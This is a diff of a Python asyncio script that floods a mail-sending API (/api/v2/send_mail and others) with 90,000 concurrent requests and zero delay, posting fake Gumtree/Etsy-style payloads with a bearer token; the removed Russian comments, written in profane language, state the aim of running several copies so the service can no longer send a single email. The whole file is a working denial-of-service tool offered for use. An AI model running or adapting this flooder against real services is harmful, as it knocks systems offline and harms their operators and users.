@@ -1,8 +1,3 @@
-
-#опять уебало письмо в спам? сапорт общается как ебанный накуренный хуесос? не проблема! 
-#запустить 5 копий файла и больше эта хуита не отправить ни1 письмо 
-# result - > https://check-host.net/check-report/325069c0k84a
-
 import asyncio
 import aiohttp
 import json
@@ -13,7 +8,7 @@ from pathlib import Path
 from uuid import uuid4
 import random
 import secrets
-
+import time
 def generate_key(length=32):
     return secrets.token_hex(length)
 
@@ -24,15 +19,18 @@ CONCURRENCY = 90000
 DELAY_SECONDS = 0           
 PER_REQUEST_TIMEOUT = 0
 MAX_SNIPPET = 10
-
+HEADERS = {
+    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36",
+    "Authorization": f"Bearer {API_KEY}",
+    "Content-Type": "application/json",
+}
 
 endpoints = [
     {"path": "/index", "method": "GET", "summary": "Проверка работоспособности сервиса"},
     {"path": "/api/v2/send_mail", "method": "Post", "summary": "Отправка письма"},
+    {"path": "/api/v2/send_mail", "method": "GET", "summary": "Отправка письма"},
     {"path": "/api/v2/get_services", "method": "GET", "summary": "Получение списка сервисов"},
 ]
-
-
 
 stop_event = asyncio.Event()
 
@@ -57,7 +55,7 @@ def make_payload():
         "name": f"бембембембем_{uid}",
         "photo": "",
         "url": f"https://ETSYSUPER283284742.com/product/{uuid4()}",
-        "email": f"RICH+RICK+AHAHAHA+!@*$&$!@&$@!+{uid}@example.com",
+        "email": f"NyaMeowUwu{uid}@gmail.com",
         "country_code": "AU",
         "service_code": "gumtree",
         "template": TEMPLATE,
@@ -78,16 +76,17 @@ async def send_once(session, endpoint):
     start = time.time()
     try:
         if endpoint["method"].upper() == "GET":
-            async with session.get(url, timeout=PER_REQUEST_TIMEOUT) as resp:
+            async with session.get(url, headers=HEADERS, timeout=PER_REQUEST_TIMEOUT) as resp:
                 text = await resp.text()
                 entry["status"] = resp.status
-                entry["response_text_snippet"] = text[:MAX_SNIPPET]
+                entry["response_text"] = text
         elif endpoint["method"].upper() == "POST":
             payload = make_payload()
-            async with session.post(url, json=payload, timeout=PER_REQUEST_TIMEOUT) as resp:
+            async with session.post(url, json=payload, headers=HEADERS, timeout=PER_REQUEST_TIMEOUT) as resp:
+
                 text = await resp.text()
                 entry["status"] = resp.status
-                entry["response_text_snippet"] = text[:MAX_SNIPPET]
+                entry["response_text"] = text
         else:
             entry["error"] = f"Unsupported method: {endpoint['method']}"
     except Exception as e:
@@ -104,7 +103,10 @@ async def worker(worker_id, session):
             entry = await send_once(session, ep)
             snippet = entry.get("response_text_snippet") or entry.get("error")
             print(f"[{entry['timestamp']}] worker#{worker_id} iter#{iteration} {ep['method']} {ep['path']} -> "
-                  f"{entry.get('status') or 'ERR'} | ")
+                  f"{entry.get('status') or 'ERR'} | "f"Response: {entry.get('response_text') or entry.get('error')}\n"
+                )
+
+                        
         try:
             await asyncio.wait_for(stop_event.wait(), timeout=DELAY_SECONDS)
             break
@@ -125,4 +127,3 @@ if __name__ == "__main__":
         asyncio.run(main())
     except KeyboardInterrupt:
         print("\nKeyboardInterrupt — завершаюсь.")
-
